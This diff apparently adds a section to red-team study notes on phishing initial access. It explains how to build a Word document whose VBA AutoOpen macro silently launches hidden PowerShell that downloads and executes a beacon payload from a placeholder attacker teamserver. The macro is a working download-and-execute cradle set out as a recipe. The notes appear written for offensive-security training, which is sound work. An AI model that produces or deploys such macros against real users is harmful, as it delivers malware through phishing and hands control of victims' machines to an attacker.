@@ -38,3 +38,15 @@ With user creds you could just go to that email subdomain through a browser and 
 
 **Initial Access Payloads**
 You can attach a payload in the email or send a url where to download the malicious file. MOTW exists for any files downloaded via a browser which makes the file look untrusted. 
+
+## VBA Macros
+We can use VBA Macros to exist code using microsoft office. Open word on the attacker desktop go to View>Macros>Create. Change the "Macros in" field from "All active templates and documents" to "Document 1". Give the macros a name and save it. To have it execute on open use AutoOpen, in the below it will download a powershell payload from beacon that we set up. The /a is the powershell payload URI, and the attackerserver is the teamserver we are using to host this. You can check beacon payloads in command and control to review this.  
+```
+Sub AutoOpen()
+
+  Dim Shell As Object
+  Set Shell = CreateObject("wscript.shell")
+  Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://<attackerserver>/a'))"""
+
+End Sub
+```
